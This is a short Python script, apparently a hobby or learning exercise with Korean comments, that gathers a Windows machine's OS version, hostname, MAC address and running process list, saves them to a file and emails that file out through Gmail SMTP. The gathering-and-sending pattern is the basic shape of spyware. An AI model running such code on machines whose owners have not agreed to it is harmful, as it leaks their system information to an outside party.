import platform
import socket
from uuid import getnode as get_mac
from win32com.client import GetObject # pywin32
import smtplib
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import os.path

def getProcessList():
    WMI = GetObject('winmgmts:')
    processes = WMI.InstancesOf('Win32_Process')
    pslist = list()
    for process in processes:
        pslist.append(process.Properties_('Name').Value)
    return pslist

def sendmail(gmail_sender, gmail_recipient, gmail_passwd, subject, filename): # https://hwangyoungjae.tistory.com/118
    try:
        msg = MIMEBase("multipart", "mixed")
        msg['Subject'] = subject
        msg['From'] = gmail_sender
        msg['To'] = gmail_recipient

        # Make MINEType
        file = open(filename, 'rb')
        filepart = MIMEText(file.read(), _charset='UTF-8')
        file.close()

        # 만들었던 mime을 MIMEBase에 첨부
        msg.attach(filepart)

        # 첨부파일에 대한 정보 추가
        msg.add_header('Content-Disposition', 'attachment', filename=filename)

        mailserver = smtplib.SMTP('smtp.gmail.com', 587) # STMP name, STMP port
        mailserver.ehlo() # say hello
        mailserver.starttls() # TLS 보안 시작
        mailserver.login(gmail_sender, gmail_passwd)
        mailserver.sendmail(gmail_sender, [gmail_recipient], msg.as_string()) # 메일 발송
        mailserver.close()
        print("메일을 전송 완료하였습니다.")
    except:
        print("메일 전송이 실패하였습니다.")

if __name__ == '__main__':
    filename = "info.txt" # ex) info.txt
    savepath = os.path.expanduser('~') + "\\" + filename
    print(savepath)
    OSVersion = platform.platform() # https://pinkwink.kr/1002
    name = socket.gethostname()
    mac = get_mac() # https://codeday.me/ko/qa/20190308/26157.html
    pslist = getProcessList() # http://m.blog.daum.net/paulsthink/6002608

    data = "OS Version : " + OSVersion \
            + "\nPC name : " + name \
            + "\nMAC : " + hex(mac).upper() \
            + "\n\n[ Process List ]\n"
    for list in pslist:
        data += list + "\n"

    f = open(savepath, mode='wt', encoding='utf-8')
    f.write(data)
    f.close()
    sendmail("sender", "recipient", "passwd", "subject", savepath)
    # gmail 의 경우 외부 라이브러리가 접근하는 것에는 보안 설정을 풀어줘야 동작함
